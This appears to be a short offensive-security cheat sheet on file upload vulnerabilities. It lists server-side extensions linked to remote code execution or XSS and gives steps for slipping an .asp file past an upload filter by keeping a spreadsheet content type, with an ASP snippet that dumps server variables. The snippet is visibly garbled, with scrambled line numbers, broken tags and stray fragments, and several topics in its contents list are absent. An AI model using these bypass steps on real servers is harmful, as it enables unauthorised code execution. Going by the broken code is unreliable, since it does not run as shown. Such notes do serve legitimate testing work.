# Upload Vulnerbilities 
- Bypassing Client Side Filters
- BruteForcing Extensions
- Content Type And Magic Bytes
- File Upload Using Python
- Content Type Python 
- Path Traversal
- rconfig 3.9.6 FIle Upload RCE via Python

## File Upload Extension
```bash
Try these file-uploading extensions accordingly.

ASP Applications:

.asa -> potential remote code execution

.asax -> potential remote code execution

.asp -> potential remote code execution

.aspx -> potential remote code execution

Java Applications: 

.jsp -> potential remote code execution

.jspx -> potential remote code execution

Perl Applications: 

.pl -> potential remote code execution

Python Applications: 

.py -> potential remote code execution

Ruby Applications:

.rb -> potential remote code execution

Other files that should be restricted for most applications: 

.bat
.cgi
.exe
.htm -> potential XSS
.html -> potential XSS
.jar
.rar
.shtml
.svg -> potential XSS
.swf -> potential XSS
.tar
.zip
.cer -> potential XSS
.hxt -> potential XSS
.stm -> potential XSS
```

- RCE via file upload on asp server. 
1. Do file upload normally -> send to repeater
1. Leave the "content type" the same in the post form, but change the filename to x.asp. Use a benign asp function like following:
1. Send it. If it worked, you bypassed the filter.
```bash
58 ---WebKitFor
59 Content-Disposition: form-data; name="
50 Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
51
52 <%
63 Dim Vars
54 %>
55 <TABLE width="75%" BORDER=1 align="center" cellpadding="3" cellspacing="0">
56 < For Each Vars In Request.ServerVariables %>
57
<TR>
58
59
70
</TR>
71 <% Next >
72 </TABLE>
77
<TD><%= Vars %></TD>
<TD><%= Request. ServerVariables (Vars) >&nbsp;</TD>
Walki+r.
--Veiku T...
filename="x.asp"
```
